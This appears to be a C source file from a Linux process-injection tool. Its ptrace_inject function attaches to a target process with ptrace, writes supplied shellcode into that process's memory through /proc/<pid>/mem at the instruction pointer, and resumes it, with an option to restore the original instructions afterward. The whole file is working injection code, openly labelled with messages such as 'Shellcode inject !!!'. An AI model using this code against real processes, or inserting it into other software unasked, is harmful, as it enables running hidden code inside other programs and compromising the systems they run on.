#include "inject.h"

void ptrace_inject(const char *sc, size_t len, mypid_t pid, int nonsave){
	struct user_regs_struct regs;
	char *instructions_backup, memfile[100];
	int status, memfd;

	info("Attaching process %s\n", pid.str);
	if( ptrace(PTRACE_ATTACH, pid.number, NULL, NULL) ==  - 1){
		bad("failed to attach pid %s | %s\n", pid.str, strerror(errno));
		exit(1);
	}
	waitpid(pid.number, &status, 0);

	ptrace(PTRACE_GETREGS, pid.number, NULL, &regs);

	good("process attached\n");

	info("opening /proc/%s/mem\n", pid.str);
	snprintf(memfile, sizeof(memfile), "/proc/%s/mem", pid.str);

	memfd = xopen(memfile, O_RDWR);
	good("sucess\n");

	if(!nonsave){
		instructions_backup = xmalloc(len);
		info("backup previously instructions\n");
		pread(memfd, instructions_backup, len, regs.rip);
	}

	info("writing shellcode on memory\n");
	pwrite(memfd, sc, len, regs.rip);
	good("Shellcode inject !!!\n");

	regs.rip += 2;
	ptrace(PTRACE_SETREGS, pid.number, NULL, &regs);

	if(!nonsave){
		info("resuming application ...\n");
		pwrite(memfd, "\xcc", 1, regs.rip+len-2+1);

		ptrace(PTRACE_CONT, pid.number, NULL, 0);
		waitpid(pid.number, &status, 0);

		info("restoring memory instructions\n");
		pwrite(memfd, instructions_backup, len, regs.rip-2);

		xfree(instructions_backup);

		ptrace(PTRACE_SETREGS, pid.number, NULL, &regs);
	}

	info("detaching pid ...\n");
	ptrace(PTRACE_DETACH, pid.number, NULL, NULL);


}
